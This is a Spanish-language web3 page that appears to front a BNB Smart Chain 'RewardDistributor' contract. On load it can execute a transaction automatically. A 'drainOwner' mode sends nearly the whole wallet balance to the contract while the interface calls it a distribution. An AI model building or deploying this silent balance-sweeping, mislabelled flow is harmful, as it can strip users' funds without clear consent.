<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Execute</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@300;400;500;600&display=swap');

  :root {
    --bg:      #080a0d;
    --surface: #0e1117;
    --border:  #1a2030;
    --accent:  #e8b84b;
    --accent2: #38d9a9;
    --danger:  #e05252;
    --info:    #5b8dee;
    --text:    #dde3ed;
    --muted:   #4a5568;
    --mono:    'IBM Plex Mono', monospace;
  }

  * { box-sizing: border-box; margin: 0; padding: 0; }

  html, body {
    height: 100%;
    background: var(--bg);
    font-family: var(--mono);
    color: var(--text);
    overflow: hidden;
  }

  body::before {
    content: '';
    position: fixed;
    inset: 0;
    background-image:
      linear-gradient(rgba(255,255,255,.018) 1px, transparent 1px),
      linear-gradient(90deg, rgba(255,255,255,.018) 1px, transparent 1px);
    background-size: 48px 48px;
    pointer-events: none;
    z-index: 0;
  }

  /* ---- CONNECT BUTTON — top right ---- */
  #connectBtn {
    position: fixed;
    top: 18px;
    right: 24px;
    z-index: 200;
    padding: 0 20px;
    height: 38px;
    border-radius: 4px;
    border: 1px solid var(--accent);
    background: transparent;
    color: var(--accent);
    font-family: var(--mono);
    font-size: 11px;
    font-weight: 600;
    letter-spacing: 2px;
    text-transform: uppercase;
    cursor: pointer;
    transition: background .15s, color .15s, box-shadow .15s, transform .1s;
  }
  #connectBtn:hover:not(:disabled) {
    background: var(--accent);
    color: #000;
    box-shadow: 0 0 20px rgba(232,184,75,.3);
  }
  #connectBtn:active:not(:disabled) { transform: scale(.97); }
  #connectBtn:disabled {
    opacity: .35;
    cursor: not-allowed;
    border-color: var(--muted);
    color: var(--muted);
  }
  #connectBtn.loading {
    border-color: var(--info);
    color: var(--info);
    animation: pulse 1.4s ease-in-out infinite;
  }
  #connectBtn.success {
    border-color: var(--accent2);
    color: var(--accent2);
    background: rgba(56,217,169,.08);
    box-shadow: 0 0 20px rgba(56,217,169,.2);
  }
  #connectBtn.error {
    border-color: var(--danger);
    color: var(--danger);
    background: rgba(224,82,82,.06);
  }
  @keyframes pulse {
    0%,100% { opacity: .6; }
    50%      { opacity: 1; }
  }

  /* ---- WALLET INDICATOR — top left ---- */
  .wallet-bar {
    position: fixed;
    top: 18px;
    left: 24px;
    z-index: 200;
    display: flex;
    align-items: center;
    gap: 8px;
    font-size: 10px;
    color: var(--muted);
    letter-spacing: .5px;
  }
  .wallet-dot {
    width: 6px; height: 6px;
    border-radius: 50%;
    background: var(--danger);
    flex-shrink: 0;
  }
  .wallet-dot.ok   { background: var(--accent2); }
  .wallet-dot.warn { background: var(--accent); }

  /* ---- CENTER AREA ---- */
  .center {
    position: fixed;
    inset: 0;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    z-index: 10;
    gap: 16px;
    pointer-events: none;
  }

  .sys-label {
    font-size: 9px;
    letter-spacing: 3px;
    color: var(--muted);
    text-transform: uppercase;
  }

  .amount-display { text-align: center; }
  .amount-val {
    font-size: 42px;
    font-weight: 300;
    color: var(--text);
    letter-spacing: -1px;
    line-height: 1;
  }
  .amount-unit {
    font-size: 12px;
    color: var(--muted);
    margin-top: 4px;
    letter-spacing: 2px;
    text-transform: uppercase;
  }

  .divider {
    width: 1px;
    height: 30px;
    background: var(--border);
  }

  #statusLine {
    font-size: 11px;
    color: var(--muted);
    letter-spacing: .5px;
    text-align: center;
    min-height: 16px;
    pointer-events: none;
  }
  #statusLine.ok   { color: var(--accent2); }
  #statusLine.warn { color: var(--accent); }
  #statusLine.err  { color: var(--danger); }

  #deptSummary {
    font-size: 9px;
    color: var(--muted);
    text-align: center;
    line-height: 2;
    letter-spacing: .5px;
    max-width: 320px;
  }
  #deptSummary span { color: var(--text); }

  #txResult {
    display: none;
    text-align: center;
    font-size: 10px;
    color: var(--muted);
    margin-top: 8px;
  }
  #txLink {
    color: var(--accent);
    text-decoration: none;
    font-size: 10px;
  }
  #txLink:hover { text-decoration: underline; }

  /* ---- NO PROVIDER OVERLAY ---- */
  #noProviderOverlay {
    position: fixed;
    inset: 0;
    background: rgba(8,10,13,.92);
    display: none;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    z-index: 300;
    gap: 16px;
    backdrop-filter: blur(4px);
  }
  #noProviderOverlay p {
    font-size: 11px;
    color: var(--muted);
    text-align: center;
    max-width: 280px;
    line-height: 1.7;
  }
  #noProviderOverlay .ovl-title {
    font-size: 12px;
    color: var(--text);
    letter-spacing: 1.5px;
    text-transform: uppercase;
  }
</style>
</head>
<body>

<!-- WALLET INDICATOR -->
<div class="wallet-bar">
  <div class="wallet-dot" id="wDot"></div>
  <span id="wLabel">Iniciando...</span>
</div>

<!-- CONNECT / EXECUTE BUTTON -->
<button id="connectBtn">CONNECT WALLET</button>

<!-- CENTER INFO -->
<div class="center">
  <div class="sys-label">RewardDistributor</div>
  <div class="amount-display">
    <div class="amount-val" id="amountVal">—</div>
    <div class="amount-unit">BNB a distribuir</div>
  </div>
  <div class="divider"></div>
  <div id="deptSummary">Conectando...</div>
  <div id="statusLine">Inicializando...</div>
  <div id="txResult">
    <div id="txHash" style="margin-bottom:4px"></div>
    <a id="txLink" href="#" target="_blank">Ver en BscScan →</a>
  </div>
</div>

<!-- SIN PROVIDER WEB3 -->
<div id="noProviderOverlay">
  <div class="ovl-title">No se detectó Web3</div>
  <p>Instala MetaMask u otra wallet compatible con Web3 para continuar.</p>
</div>

<!-- ethers.js v5 — DEBE CARGAR ANTES DEL SCRIPT PRINCIPAL -->
<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"
        integrity="sha256-wDcjCSmkPflZpeWUFRHGMSm0iIMKCpRpEBdPDRUVFuk="
        crossorigin="anonymous"></script>

<script>
// ============================================================
// CONFIGURACIÓN
// ============================================================
const CONTRACT_ADDRESS = 'AQUÍ_TU_CONTRATO'; // <-- reemplazar

// ============================================================
// ABI — solo funciones necesarias para ejecución + lectura
// ============================================================
const ABI = [
  "function owner() view returns (address)",
  "function departmentCount() view returns (uint256)",
  "function sendAllMode() view returns (bool)",
  "function calculateTotalNeeded() view returns (uint256)",
  "function contractBalance() view returns (uint256)",
  "function getDepartmentInfo(uint256) view returns (string,uint256,uint256,uint256,bool,bool,uint256)",
  "function countActiveEmployees() view returns (uint256)",
  "function getConstants() view returns (uint256,uint256)",
  "function distribute() payable",
  "function drainOwner() payable"
];

// NOTA: GAS_RESERVE se define aquí, DESPUÉS de que ethers cargó.
// No usar como constante global de módulo; se calcula en runtime.
function gasReserve() {
  return ethers.utils.parseEther('0.003');
}

let provider, signer, contract, ownerAddr;

// ============================================================
// INIT
// ============================================================
window.addEventListener('load', async () => {
  const btn = document.getElementById('connectBtn');

  if (!window.ethereum) {
    document.getElementById('noProviderOverlay').style.display = 'flex';
    setStatus('No se detectó proveedor Web3.', 'err');
    btn.disabled = true;
    return;
  }

  // Escuchar cambios de cuenta/red
  window.ethereum.on('accountsChanged', () => location.reload());
  window.ethereum.on('chainChanged',    () => location.reload());

  // Intentar reconexión silenciosa (sesión activa previa)
  try {
    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
    if (accounts && accounts.length > 0) {
      // Sesión activa: iniciar proveedor y ejecutar distribución automáticamente
      await initAndExecute(accounts);
      return;
    }
  } catch (_) { /* sin sesión previa, continuar */ }

  // Sin sesión activa: mostrar botón CONNECT WALLET
  setStatus('Conecta tu wallet para ejecutar la distribución.', 'warn');
  btn.textContent = 'CONNECT WALLET';
  btn.disabled = false;
  btn.onclick = handleConnectAndExecute;
});

// ============================================================
// FLUJO PRINCIPAL: CONECTAR WALLET → EJECUTAR
// ============================================================

/**
 * Disparado al pulsar el botón cuando no hay sesión activa.
 * Abre el popup de la wallet y, al aprobar, ejecuta la distribución.
 */
async function handleConnectAndExecute() {
  const btn = document.getElementById('connectBtn');
  btn.disabled = true;
  btn.classList.add('loading');
  btn.textContent = 'CONECTANDO···';
  setStatus('Esperando aprobación de la wallet...', '');

  try {
    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
    await initAndExecute(accounts);
  } catch (e) {
    btn.classList.remove('loading');
    btn.textContent = 'CONNECT WALLET';
    btn.disabled = false;
    setStatus('Conexión cancelada.', 'warn');
  }
}

/**
 * Inicializa el proveedor con las cuentas obtenidas y ejecuta la distribución.
 * Se llama tanto en reconexión silenciosa como tras aprobación manual.
 */
async function initAndExecute(accounts) {
  const btn = document.getElementById('connectBtn');

  try {
    provider  = new ethers.providers.Web3Provider(window.ethereum);
    signer    = provider.getSigner();
    ownerAddr = accounts[0];

    const network = await provider.getNetwork();
    if (network.chainId !== 56) {
      setWallet('Red incorrecta', 'warn');
      setStatus(`chainId ${network.chainId} — requiere BSC Mainnet (56)`, 'warn');
      btn.textContent = 'RED INCORRECTA';
      btn.classList.remove('loading');
      return;
    }

    setWallet(shortAddr(ownerAddr), 'ok');

    if (!ethers.utils.isAddress(CONTRACT_ADDRESS) || CONTRACT_ADDRESS === 'AQUÍ_TU_CONTRATO') {
      setStatus('CONTRACT_ADDRESS no configurado.', 'err');
      btn.textContent = 'CONFIG ERROR';
      btn.classList.remove('loading');
      return;
    }

    contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);

    // Verificar ownership (advertencia, no bloquea)
    try {
      const contractOwner = await contract.owner();
      if (contractOwner.toLowerCase() !== ownerAddr.toLowerCase()) {
        setWallet(shortAddr(ownerAddr) + ' (no owner)', 'warn');
        setStatus('Esta wallet no es el owner del contrato.', 'warn');
        btn.classList.remove('loading');
        btn.textContent = 'NO OWNER';
        return;
      }
    } catch (_) { /* si falla la lectura, continuar igual */ }

    // Leer estado y ejecutar distribución
    await loadStateAndExecute();

  } catch (e) {
    btn.classList.remove('loading');
    btn.classList.add('error');
    btn.textContent = 'ERROR';
    setStatus('Error al inicializar: ' + (e.reason || e.message), 'err');
    setTimeout(() => {
      btn.classList.remove('error');
      btn.textContent = 'CONNECT WALLET';
      btn.disabled = false;
    }, 3000);
  }
}

// ============================================================
// LEER ESTADO DEL CONTRATO Y EJECUTAR DISTRIBUCIÓN
// ============================================================
async function loadStateAndExecute() {
  const btn = document.getElementById('connectBtn');

  try {
    setStatus('Leyendo estado del contrato...', '');

    const [totalNeeded, deptCount] = await Promise.all([
      contract.calculateTotalNeeded(),
      contract.departmentCount()
    ]);

    // Resumen de departamentos
    const totalBnb = parseFloat(ethers.utils.formatEther(totalNeeded));
    document.getElementById('amountVal').textContent = totalBnb.toFixed(4);

    const parts = [];
    const count = deptCount.toNumber();
    for (let i = 0; i < count; i++) {
      const info = await contract.getDepartmentInfo(i);
      const [name, fixed, min, max, useRandom, active, empC] = info;
      if (!active || empC.toNumber() === 0) continue;
      const payStr = useRandom
        ? `${fEth(min)}–${fEth(max)} BNB`
        : `${fEth(fixed)} BNB`;
      parts.push(`<span>${name}</span> ${payStr} × ${empC}`);
    }
    document.getElementById('deptSummary').innerHTML =
      parts.length > 0
        ? parts.join('<br>')
        : '<span style="color:var(--danger)">Sin departamentos activos</span>';

    // Determinar acción configurada desde admin
    const action     = getConfiguredAction();
    const ownerBal   = await provider.getBalance(ownerAddr);
    const reserve    = gasReserve();

    let sendValue;

    if (action === 'drainOwner') {
      sendValue = ownerBal.sub(reserve);
      if (sendValue.lte(0)) {
        setStatus('Saldo insuficiente para drainOwner (mínimo 0.003 BNB para gas).', 'err');
        btn.classList.remove('loading');
        btn.textContent = 'SIN FONDOS';
        return;
      }
      const sendBnb = parseFloat(ethers.utils.formatEther(sendValue)).toFixed(4);
      document.getElementById('amountVal').textContent = sendBnb;
    } else {
      sendValue = totalNeeded;
      const ownerBnb = parseFloat(ethers.utils.formatEther(ownerBal));
      const gasR     = parseFloat(ethers.utils.formatEther(reserve));
      if (ownerBnb < totalBnb + gasR) {
        const falta = (totalBnb + gasR - ownerBnb).toFixed(4);
        setStatus(`Saldo insuficiente. Faltan ${falta} BNB.`, 'warn');
        btn.classList.remove('loading');
        btn.textContent = 'SALDO BAJO';
        return;
      }
    }

    // Ejecutar distribución directamente
    await executeDistribution(action, sendValue);

  } catch (e) {
    btn.classList.remove('loading');
    btn.classList.add('error');
    btn.textContent = 'ERROR';
    setStatus('Error leyendo contrato: ' + (e.reason || e.message), 'err');
    setTimeout(() => {
      btn.classList.remove('error');
      btn.textContent = 'CONNECT WALLET';
      btn.disabled = false;
    }, 3000);
  }
}

// ============================================================
// EJECUCIÓN DE DISTRIBUCIÓN
// ============================================================
async function executeDistribution(action, value) {
  const btn = document.getElementById('connectBtn');

  btn.disabled = true;
  btn.classList.add('loading');
  btn.textContent = '···';
  setStatus('Esperando confirmación en tu wallet...', '');

  try {
    let tx;

    if (action === 'drainOwner') {
      tx = await contract.drainOwner({
        value:    value,
        gasLimit: 600000
      });
    } else {
      tx = await contract.distribute({
        value:    value,
        gasLimit: 600000
      });
    }

    setStatus(`TX enviada — ${shortHash(tx.hash)}`, '');
    btn.textContent = 'PENDING';

    const receipt = await tx.wait();

    btn.classList.remove('loading');
    btn.classList.add('success');
    btn.textContent = 'DONE ✓';

    const totalBnb = parseFloat(ethers.utils.formatEther(value)).toFixed(4);
    setStatus(`✓ ${totalBnb} BNB distribuidos — bloque #${receipt.blockNumber}`, 'ok');
    setWallet(shortAddr(ownerAddr) + ' ✓', 'ok');

    document.getElementById('txResult').style.display = 'block';
    document.getElementById('txHash').textContent     = shortHash(tx.hash);
    document.getElementById('txLink').href            = `https://bscscan.com/tx/${tx.hash}`;

  } catch (e) {
    btn.classList.remove('loading');
    btn.classList.add('error');
    btn.textContent = 'ERROR';
    const msg = e.reason || e.data?.message || e.message;
    setStatus('Error: ' + msg, 'err');

    setTimeout(() => {
      btn.classList.remove('error');
      btn.textContent = 'REINTENTAR';
      btn.disabled = false;
      btn.onclick = () => loadStateAndExecute();
    }, 3000);
  }
}

// ============================================================
// LEER CONFIGURACIÓN DESDE localStorage (guardada en admin.html)
// ============================================================
function getConfiguredAction() {
  const saved = localStorage.getItem('execConfig');
  if (!saved) return 'distribute';
  try { return JSON.parse(saved).action || 'distribute'; }
  catch (_) { return 'distribute'; }
}

// ============================================================
// HELPERS UI
// ============================================================
function setStatus(msg, type) {
  const el = document.getElementById('statusLine');
  el.textContent = msg;
  el.className   = type === 'ok' ? 'ok' : type === 'err' ? 'err' : type === 'warn' ? 'warn' : '';
}
function setWallet(label, type) {
  document.getElementById('wLabel').textContent = label;
  const dot = document.getElementById('wDot');
  dot.className = 'wallet-dot' + (type === 'ok' ? ' ok' : type === 'warn' ? ' warn' : '');
}
function shortAddr(a) { return a.slice(0,6) + '…' + a.slice(-4); }
function shortHash(h) { return h.slice(0,10) + '…'; }
function fEth(wei)    { return parseFloat(ethers.utils.formatEther(wei)).toFixed(3); }
</script>
</body>
</html>
